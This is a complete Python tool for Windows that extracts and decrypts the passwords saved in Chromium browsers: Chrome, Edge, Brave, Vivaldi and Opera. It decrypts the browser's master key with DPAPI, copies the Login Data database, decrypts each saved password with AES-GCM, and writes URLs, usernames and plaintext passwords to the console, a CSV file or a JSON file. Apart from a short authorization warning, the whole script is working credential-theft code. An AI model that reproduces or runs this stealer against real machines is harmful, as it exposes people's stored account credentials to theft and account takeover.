import os
import json
import base64
import sqlite3
import shutil
import argparse
import csv
import sys # For sys.exit

# --- Dependencies ---
try:
    import win32crypt
    from Crypto.Cipher import AES
except ImportError:
    print("[ERROR] Required libraries not found. Please install pycryptodome and pywin32:")
    print("pip install pycryptodome pywin32")
    sys.exit(1)

# --- Constants ---
TEMP_DB_NAME = "Loginvault_temp.db"

# --- Helper Functions ---

def debug_print(message, verbose=False):
    """Prints debug messages only if verbose mode is enabled."""
    if verbose:
        print(f"[DEBUG] {message}")

def get_master_key(local_state_path, verbose=False):
    """Retrieves and decrypts the master key from the Local State file."""
    debug_print(f"Fetching master key from: {local_state_path}", verbose)
    if not os.path.exists(local_state_path):
        print(f"[ERROR] Local State file not found: {local_state_path}")
        return None

    try:
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)

        encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            print("[ERROR] Could not find 'os_crypt.encrypted_key' in Local State file.")
            return None

        encrypted_key = base64.b64decode(encrypted_key_b64)
        encrypted_key = encrypted_key[5:] # Remove DPAPI prefix

        # Decrypt using DPAPI
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        debug_print("Master key retrieved and decrypted successfully.", verbose)
        return master_key
    except FileNotFoundError:
        print(f"[ERROR] Local State file not found during read: {local_state_path}")
        return None
    except json.JSONDecodeError:
        print(f"[ERROR] Failed to parse Local State file (JSON error): {local_state_path}")
        return None
    except KeyError:
         print("[ERROR] 'os_crypt' or 'encrypted_key' not found in Local State JSON.")
         return None
    except Exception as e:
        print(f"[ERROR] Failed to get master key: {e}")
        # Check if it's a pywintypes error specifically if needed
        # import pywintypes
        # if isinstance(e, pywintypes.error): print("DPAPI decryption failed - check user context.")
        return None

def decrypt_payload(cipher, payload):
    """Decrypts the payload using the AES cipher."""
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    """Generates an AES GCM cipher."""
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(encrypted_pass_blob, master_key, verbose=False):
    """Decrypts a single password blob using the master key."""
    if not encrypted_pass_blob:
        return "[No Password Data]"
    try:
        debug_print("Attempting to decrypt password...", verbose)
        iv = encrypted_pass_blob[3:15]      # Initialization vector starts at byte 3, is 12 bytes long
        payload = encrypted_pass_blob[15:]  # Encrypted data starts after the IV
        debug_print(f"Extracted IV: {iv.hex()}", verbose)
        # debug_print(f"Extracted Payload (first 16 bytes): {payload[:16].hex()}", verbose) # Careful logging payload

        cipher = generate_cipher(master_key, iv)
        decrypted_bytes = decrypt_payload(cipher, payload)
        # GCM includes a 16-byte authentication tag at the end
        decrypted_pass = decrypted_bytes[:-16].decode('utf-8')
        debug_print("Password decrypted successfully.", verbose)
        return decrypted_pass
    except UnicodeDecodeError:
        debug_print("[WARNING] Failed to decode decrypted password as UTF-8. Returning raw bytes.", verbose)
        return decrypted_bytes[:-16] # Return bytes if decoding fails
    except Exception as e:
        print(f"[ERROR] Failed to decrypt password blob: {e}")
        print(f"[ERROR] -> This might happen with very old Chrome versions (< V80) or corrupted data.")
        return "[Decryption Failed]"

def write_csv(data, filename):
    """Writes the extracted data to a CSV file."""
    if not data:
        print("[INFO] No data to write to CSV.")
        return
    try:
        with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
            fieldnames = ['url', 'username', 'password']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(data)
        print(f"[INFO] Data successfully written to {filename}")
    except IOError as e:
        print(f"[ERROR] Failed to write CSV file {filename}: {e}")
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred during CSV writing: {e}")


def write_json(data, filename):
    """Writes the extracted data to a JSON file."""
    if not data:
        print("[INFO] No data to write to JSON.")
        return
    try:
        with open(filename, 'w', encoding='utf-8') as jsonfile:
            json.dump(data, jsonfile, indent=4, ensure_ascii=False)
        print(f"[INFO] Data successfully written to {filename}")
    except IOError as e:
        print(f"[ERROR] Failed to write JSON file {filename}: {e}")
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred during JSON writing: {e}")

def print_results_console(data):
    """Prints the extracted data to the console."""
    if not data:
        print("\n[INFO] No credentials found or decrypted.")
        return
    print("\n--- Found Credentials ---")
    for item in data:
        print(f"URL: {item['url']}")
        print(f"User Name: {item['username']}")
        print(f"Password: {item['password']}")
        print("*" * 50)

# --- Main Execution ---
if __name__ == '__main__':
    print("*" * 60)
    print("WARNING: This script accesses sensitive browser credential data.")
    print("Use responsibly and only on systems you own or have explicit")
    print("authorization to test. Unauthorized access is illegal.")
    print("*" * 60 + "\n")

    parser = argparse.ArgumentParser(description="Extract and decrypt Chromium browser passwords (Win).")
    parser.add_argument("-b", "--browser", choices=['chrome', 'edge', 'brave', 'vivaldi', 'opera'], default='chrome', help="Target browser (default: chrome)")
    parser.add_argument("-p", "--profile", default='Default', help="Browser profile name (e.g., Default, Profile 1 - case sensitive) (default: Default)")
    parser.add_argument("-o", "--output", help="Output file path. If ends with .csv or .json, saves in that format, otherwise prints to console.")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose debug messages.")
    args = parser.parse_args()

    # Determine base path
    appdata_local = os.environ.get('LOCALAPPDATA', os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local'))
    if not appdata_local or not os.path.isdir(appdata_local):
        print(f"[ERROR] Could not determine %LOCALAPPDATA% path.")
        sys.exit(1)

    # Determine browser path
    browser_paths = {
        'chrome': os.path.join(appdata_local, 'Google', 'Chrome', 'User Data'),
        'edge': os.path.join(appdata_local, 'Microsoft', 'Edge', 'User Data'),
        'brave': os.path.join(appdata_local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'vivaldi': os.path.join(appdata_local, 'Vivaldi', 'User Data'),
        'opera': os.path.join(appdata_local, 'Opera Software', 'Opera Stable') # Opera path structure can differ slightly
    }
    browser_path = browser_paths.get(args.browser)
    if not browser_path or not os.path.isdir(browser_path):
        print(f"[ERROR] Browser path not found for {args.browser}: {browser_path}")
        sys.exit(1)

    local_state_path = os.path.join(browser_path, 'Local State')
    login_db_path_original = os.path.join(browser_path, args.profile, 'Login Data')
    login_db_path_temp = TEMP_DB_NAME # Use temp file in current directory

    debug_print(f"Targeting Browser: {args.browser}", args.verbose)
    debug_print(f"Targeting Profile: {args.profile}", args.verbose)
    debug_print(f"Local State Path: {local_state_path}", args.verbose)
    debug_print(f"Original Login DB Path: {login_db_path_original}", args.verbose)

    # Get Master Key
    master_key = get_master_key(local_state_path, args.verbose)
    if not master_key:
        print("[ERROR] Could not obtain master key. Exiting.")
        sys.exit(1)

    # Check and Copy Login DB
    if not os.path.exists(login_db_path_original):
        print(f"[ERROR] Login Data file not found for profile '{args.profile}': {login_db_path_original}")
        sys.exit(1)

    try:
        debug_print(f"Copying '{login_db_path_original}' to '{login_db_path_temp}'...", args.verbose)
        shutil.copy2(login_db_path_original, login_db_path_temp)
        debug_print("Database copied successfully.", args.verbose)
    except Exception as e:
        print(f"[ERROR] Failed to copy Login Data DB: {e}")
        print("[ERROR] -> Ensure the browser is closed or try running as administrator.")
        sys.exit(1)

    # Connect and Query DB
    conn = None
    cursor = None
    extracted_data = []
    try:
        conn = sqlite3.connect(login_db_path_temp)
        cursor = conn.cursor()
        debug_print("Querying database for stored credentials...", args.verbose)
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins") # Changed action_url to origin_url for clarity

        for row in cursor.fetchall():
            url = row[0] if row[0] else "[No URL]"
            username = row[1] if row[1] else "[No Username]"
            encrypted_password_blob = row[2]

            # debug_print(f"Raw data - URL: {url}, Username: {username}, Encrypted Length: {len(encrypted_password_blob) if encrypted_password_blob else 0}", args.verbose)

            if not url or url == "[No URL]":
                debug_print("Skipping entry with missing URL...", args.verbose)
                continue

            decrypted_password = decrypt_password(encrypted_password_blob, master_key, args.verbose)

            if decrypted_password != "[Decryption Failed]": # Only add successful decryptions
                 extracted_data.append({
                     'url': url,
                     'username': username,
                     'password': decrypted_password
                 })

    except sqlite3.Error as e:
        print(f"[ERROR] Failed to query or process the database: {e}")
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred during database processing: {e}")
    finally:
        if cursor:
            cursor.close()
            debug_print("Database cursor closed.", args.verbose)
        if conn:
            conn.close()
            debug_print("Database connection closed.", args.verbose)

    # Cleanup Temp DB
    try:
        if os.path.exists(login_db_path_temp):
            debug_print(f"Removing temporary database copy: {login_db_path_temp}", args.verbose)
            os.remove(login_db_path_temp)
            debug_print("Temporary file deleted successfully.", args.verbose)
    except Exception as e:
        print(f"[ERROR] Failed to delete temporary file '{login_db_path_temp}': {e}")

    # Handle Output
    if args.output:
        if args.output.lower().endswith(".csv"):
            write_csv(extracted_data, args.output)
        elif args.output.lower().endswith(".json"):
            write_json(extracted_data, args.output)
        else:
            print(f"[INFO] Output filename '{args.output}' has unknown extension. Printing to console.")
            print_results_console(extracted_data)
    else:
        print_results_console(extracted_data)

    debug_print("Script finished execution.", args.verbose)
    print("\n[INFO] Process completed.")